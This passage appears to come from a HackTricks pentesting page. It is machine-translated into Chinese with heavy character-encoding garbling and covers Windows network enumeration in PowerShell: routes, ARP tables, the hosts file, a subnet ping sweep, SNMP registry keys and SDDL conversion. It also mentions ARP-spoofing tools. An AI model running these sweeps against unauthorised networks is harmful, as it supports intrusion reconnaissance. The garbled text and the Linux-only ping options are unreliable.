è·¯ç”±æ¯’åŒ–æ˜¯ä¸€ç§é€šè¿‡æ“çºµè·¯ç”±è¡¨æ¥è¯¯å¯¼ç½‘ç»œæµé‡çš„æ–¹æ³•ã€‚é€šè¿‡æ³¨å…¥è™šå‡çš„è·¯ç”±ä¿¡æ¯ï¼Œæ”»å‡»è€…å¯ä»¥å°†æµé‡é‡å®šå‘åˆ°æ¶æ„ç›®æ ‡æˆ–å¯¼è‡´ç½‘ç»œä¸­æ–­ã€‚

#### Route Tracing

Route tracing, also known as traceroute, is a technique used to determine the path that network traffic takes from a source to a destination. This can be useful for identifying network bottlenecks, troubleshooting connectivity issues, and understanding the network topology.

è·¯ç”±è·Ÿè¸ªï¼Œä¹Ÿç§°ä¸ºtracerouteï¼Œæ˜¯ä¸€ç§ç”¨äºç¡®å®šç½‘ç»œæµé‡ä»æºåˆ°ç›®çš„åœ°çš„è·¯å¾„çš„æŠ€æœ¯ã€‚è¿™å¯¹äºè¯†åˆ«ç½‘ç»œç“¶é¢ˆã€è§£å†³è¿æ¥é—®é¢˜å’Œäº†è§£ç½‘ç»œæ‹“æ‰‘éå¸¸æœ‰ç”¨ã€‚
```powershell
route print
```
### ARP

ARPï¼ˆåœ°å€è§£æåè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºå°†IPåœ°å€æ˜ å°„åˆ°ç‰©ç†MACåœ°å€çš„åè®®ã€‚åœ¨å±€åŸŸç½‘ä¸­ï¼ŒARPè¢«ç”¨äºç¡®å®šç›®æ ‡è®¾å¤‡çš„MACåœ°å€ï¼Œä»¥ä¾¿åœ¨æ•°æ®åŒ…ä¼ è¾“è¿‡ç¨‹ä¸­æ­£ç¡®åœ°å°†æ•°æ®åŒ…å‘é€åˆ°ç›®æ ‡è®¾å¤‡ã€‚

ARPæ¬ºéª—æ˜¯ä¸€ç§åˆ©ç”¨ARPåè®®çš„æ¼æ´æ¥æ¬ºéª—ç½‘ç»œè®¾å¤‡çš„æ”»å‡»æŠ€æœ¯ã€‚æ”»å‡»è€…å¯ä»¥å‘é€è™šå‡çš„ARPå“åº”ï¼Œå°†ç›®æ ‡è®¾å¤‡çš„IPåœ°å€æ˜ å°„åˆ°æ”»å‡»è€…çš„MACåœ°å€ä¸Šã€‚è¿™æ ·ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ‹¦æˆªã€ä¿®æ”¹æˆ–é‡å®šå‘ç›®æ ‡è®¾å¤‡çš„ç½‘ç»œæµé‡ã€‚

åœ¨è¿›è¡ŒARPæ¬ºéª—æ—¶ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šä½¿ç”¨å·¥å…·å¦‚Ettercapã€ARPspoofæˆ–Bettercapæ¥å‘é€è™šå‡çš„ARPå“åº”ã€‚è¿™äº›å·¥å…·å…è®¸æ”»å‡»è€…æ¬ºéª—ç›®æ ‡è®¾å¤‡ï¼Œä½¿å…¶ç›¸ä¿¡æ”»å‡»è€…çš„MACåœ°å€æ˜¯æ­£ç¡®çš„ã€‚

ä¸ºäº†é˜²æ­¢ARPæ¬ºéª—æ”»å‡»ï¼Œå¯ä»¥é‡‡å–ä¸€äº›åŸºæœ¬çš„é˜²å¾¡æªæ–½ï¼Œå¦‚ä½¿ç”¨é™æ€ARPè¡¨ã€å¯ç”¨ARPæ£€æµ‹å’Œé˜²å¾¡å·¥å…·ã€ä½¿ç”¨ç½‘ç»œéš”ç¦»å’Œå®‰å…¨è®¤è¯ç­‰ã€‚è¿™äº›æªæ–½å¯ä»¥å¸®åŠ©ä¿æŠ¤ç½‘ç»œå…å—ARPæ¬ºéª—æ”»å‡»çš„å½±å“ã€‚
```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### ä¸»æœº

The `hosts` file is a plain text file used by operating systems to map hostnames to IP addresses. It is commonly used to block or redirect certain websites or to override DNS settings. As a pentester, you can leverage the `hosts` file to redirect traffic to your own IP address or to bypass DNS resolution.

### ä¸»æœºæ–‡ä»¶

`hosts`æ–‡ä»¶æ˜¯æ“ä½œç³»ç»Ÿä½¿ç”¨çš„çº¯æ–‡æœ¬æ–‡ä»¶ï¼Œç”¨äºå°†ä¸»æœºåæ˜ å°„åˆ°IPåœ°å€ã€‚å®ƒé€šå¸¸ç”¨äºé˜»æ­¢æˆ–é‡å®šå‘ç‰¹å®šçš„ç½‘ç«™ï¼Œæˆ–è€…ç”¨äºè¦†ç›–DNSè®¾ç½®ã€‚ä½œä¸ºæ¸—é€æµ‹è¯•äººå‘˜ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨`hosts`æ–‡ä»¶å°†æµé‡é‡å®šå‘åˆ°è‡ªå·±çš„IPåœ°å€ï¼Œæˆ–è€…ç»•è¿‡DNSè§£æã€‚
```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### Ping

Pingæ˜¯ä¸€ç§å¸¸ç”¨çš„ç½‘ç»œå·¥å…·ï¼Œç”¨äºæµ‹è¯•ä¸»æœºä¹‹é—´çš„è¿é€šæ€§ã€‚å®ƒé€šè¿‡å‘ç›®æ ‡ä¸»æœºå‘é€ICMPå›æ˜¾è¯·æ±‚å¹¶ç­‰å¾…å›å¤æ¥ç¡®å®šä¸»æœºæ˜¯å¦å¯è¾¾ã€‚Pingå‘½ä»¤é€šå¸¸ç”¨äºè¯Šæ–­ç½‘ç»œé—®é¢˜å’Œæµ‹é‡ç½‘ç»œå»¶è¿Ÿã€‚

ä½¿ç”¨Pingå‘½ä»¤å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š

- æ£€æŸ¥ç›®æ ‡ä¸»æœºæ˜¯å¦åœ¨çº¿
- æµ‹è¯•ç½‘ç»œè¿æ¥çš„ç¨³å®šæ€§
- æµ‹é‡ç½‘ç»œå»¶è¿Ÿ
- ç¡®å®šç½‘ç»œä¸­çš„ä¸¢åŒ…ç‡

Pingå‘½ä»¤çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š

```
ping <ç›®æ ‡ä¸»æœº>
```

å…¶ä¸­ï¼Œ`<ç›®æ ‡ä¸»æœº>`æ˜¯è¦æµ‹è¯•è¿é€šæ€§çš„ä¸»æœºçš„IPåœ°å€æˆ–åŸŸåã€‚

Pingå‘½ä»¤ä¼šå‘é€ä¸€ç³»åˆ—ICMPå›æ˜¾è¯·æ±‚åˆ°ç›®æ ‡ä¸»æœºï¼Œå¹¶æ˜¾ç¤ºæ¯ä¸ªè¯·æ±‚çš„å¾€è¿”æ—¶é—´ï¼ˆRTTï¼‰ä»¥åŠä¸¢åŒ…æƒ…å†µã€‚é€šè¿‡è§‚å¯ŸPingå‘½ä»¤çš„è¾“å‡ºï¼Œå¯ä»¥åˆ¤æ–­ç›®æ ‡ä¸»æœºçš„è¿é€šæ€§å’Œç½‘ç»œè´¨é‡ã€‚

Pingå‘½ä»¤è¿˜æ”¯æŒä¸€äº›å¯é€‰å‚æ•°ï¼Œä¾‹å¦‚ï¼š

- `-c <æ¬¡æ•°>`ï¼šæŒ‡å®šå‘é€ICMPè¯·æ±‚çš„æ¬¡æ•°ã€‚
- `-i <é—´éš”>`ï¼šæŒ‡å®šå‘é€ICMPè¯·æ±‚çš„é—´éš”æ—¶é—´ã€‚
- `-s <å¤§å°>`ï¼šæŒ‡å®šICMPè¯·æ±‚çš„æ•°æ®åŒ…å¤§å°ã€‚

ä½¿ç”¨Pingå‘½ä»¤æ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

- Pingå‘½ä»¤éœ€è¦åœ¨å‘½ä»¤è¡Œç•Œé¢ï¼ˆå¦‚Windowsçš„å‘½ä»¤æç¤ºç¬¦æˆ–Linuxçš„ç»ˆç«¯ï¼‰ä¸­æ‰§è¡Œã€‚
- éœ€è¦å…·æœ‰è¶³å¤Ÿçš„æƒé™æ‰èƒ½æ‰§è¡ŒPingå‘½ä»¤ã€‚
- æœ‰äº›ç½‘ç»œè®¾å¤‡ï¼ˆå¦‚é˜²ç«å¢™ï¼‰å¯èƒ½ä¼šé˜»æ­¢Pingè¯·æ±‚ï¼Œå¯¼è‡´æ— æ³•æ­£å¸¸æ‰§è¡ŒPingå‘½ä»¤ã€‚

Pingå‘½ä»¤æ˜¯ç½‘ç»œè¯Šæ–­å’Œæ•…éšœæ’é™¤ä¸­çš„é‡è¦å·¥å…·ï¼Œå¯¹äºç½‘ç»œç®¡ç†å‘˜å’Œå®‰å…¨ä¸“ä¸šäººå‘˜æ¥è¯´éå¸¸æœ‰ç”¨ã€‚
```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```
### SNMP

SNMPï¼ˆSimple Network Management Protocolï¼‰æ˜¯ä¸€ç§ç”¨äºç®¡ç†å’Œç›‘æ§ç½‘ç»œè®¾å¤‡çš„åè®®ã€‚å®ƒå…è®¸ç®¡ç†å‘˜é€šè¿‡å‘é€å’Œæ¥æ”¶æ¶ˆæ¯æ¥è·å–æœ‰å…³è®¾å¤‡çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ç³»ç»ŸçŠ¶æ€ã€ç½‘ç»œæµé‡å’Œé”™è¯¯æ—¥å¿—ã€‚SNMPä½¿ç”¨åŸºäºUDPçš„ä¼ è¾“åè®®ï¼Œå¹¶ä½¿ç”¨MIBï¼ˆManagement Information Baseï¼‰æ¥å®šä¹‰è®¾å¤‡ä¸Šå¯ç”¨çš„ä¿¡æ¯ã€‚

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨SNMPåè®®æ¥è·å–ç›®æ ‡ç½‘ç»œè®¾å¤‡çš„æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚è®¾å¤‡é…ç½®ã€ç”¨æˆ·å‡­æ®å’Œç½‘ç»œæ‹“æ‰‘ã€‚ä»–ä»¬å¯ä»¥ä½¿ç”¨SNMPå·¥å…·æ¥æ‰«æç½‘ç»œå¹¶å‘ç°SNMPæœåŠ¡ï¼Œç„¶åä½¿ç”¨é»˜è®¤æˆ–å¼±å¯†ç è¿›è¡Œèº«ä»½éªŒè¯ã€‚ä¸€æ—¦æˆåŠŸç™»å½•ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œå„ç§æ“ä½œï¼ŒåŒ…æ‹¬ä¿®æ”¹è®¾å¤‡é…ç½®ã€ç›‘æ§ç½‘ç»œæµé‡å’Œæ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚

ä¸ºäº†é˜²æ­¢SNMPæ”»å‡»ï¼Œç®¡ç†å‘˜å¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

- ç¦ç”¨ä¸å¿…è¦çš„SNMPæœåŠ¡æˆ–å°†å…¶é™åˆ¶åœ¨å—ä¿¡ä»»çš„ä¸»æœºä¸Šã€‚
- ä½¿ç”¨å¼ºå¯†ç æ¥ä¿æŠ¤SNMPèº«ä»½éªŒè¯ã€‚
- å®šæœŸæ›´æ–°è®¾å¤‡çš„å›ºä»¶å’Œæ“ä½œç³»ç»Ÿä»¥ä¿®å¤å·²çŸ¥çš„SNMPæ¼æ´ã€‚
- ç›‘æ§SNMPæ´»åŠ¨å¹¶æ£€æµ‹å¼‚å¸¸è¡Œä¸ºï¼Œä¾‹å¦‚é¢‘ç¹çš„èº«ä»½éªŒè¯å¤±è´¥æˆ–å¤§é‡çš„SNMPæŸ¥è¯¢ã€‚

é€šè¿‡é‡‡å–è¿™äº›æªæ–½ï¼Œç®¡ç†å‘˜å¯ä»¥å¢å¼ºç½‘ç»œè®¾å¤‡çš„å®‰å…¨æ€§ï¼Œå¹¶å‡å°‘å—åˆ°SNMPæ”»å‡»çš„é£é™©ã€‚
```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
## **å°†SDDLå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯è¯»æ ¼å¼**

To convert the SDDL (Security Descriptor Definition Language) string into a readable format, you can use the `ConvertFrom-SddlString` cmdlet in PowerShell. This cmdlet allows you to parse and interpret the SDDL string, providing a more human-readable output.

```powershell
$sddlString = "D:(A;;GA;;;WD)(A;;GA;;;BA)"
$securityDescriptor = ConvertFrom-SddlString -Sddl $sddlString
$securityDescriptor
```

The `ConvertFrom-SddlString` cmdlet takes the SDDL string as input and returns a `System.Security.AccessControl.CommonSecurityDescriptor` object. This object contains the parsed information from the SDDL string, such as the access control entries (ACEs) and their corresponding permissions.

By running the above code, you will see the converted SDDL string in a readable format, which includes the access control entries and their permissions.

Note: It is important to understand the SDDL format and its components to effectively interpret the converted output.
```powershell

PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"
Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
(CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users:
SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
(Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

